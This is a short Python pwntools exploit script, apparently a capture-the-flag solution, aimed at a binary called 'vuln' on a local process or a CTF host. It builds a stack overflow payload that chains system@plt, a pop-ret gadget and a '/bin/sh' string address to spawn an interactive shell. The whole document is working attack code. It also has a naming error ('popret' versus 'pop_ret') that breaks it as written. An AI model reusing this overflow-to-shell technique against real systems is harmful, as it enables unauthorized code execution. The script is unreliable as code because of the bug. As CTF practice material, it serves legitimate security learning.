from pwn import *
import sys

if len(sys.argv) == 1 :
	p = process('./vuln')
else :
	p = connect('icewall-ctf.kr', 10200)

system_plt = 0x80483E0
pop_ret = 0x80483A5
sh_str = 0x8048660

payload = 'A'*(0x12+4)
payload += p32(system_plt)
payload += p32(popret)
payload += p32(sh_str)

p.sendline(payload)

p.interactive()
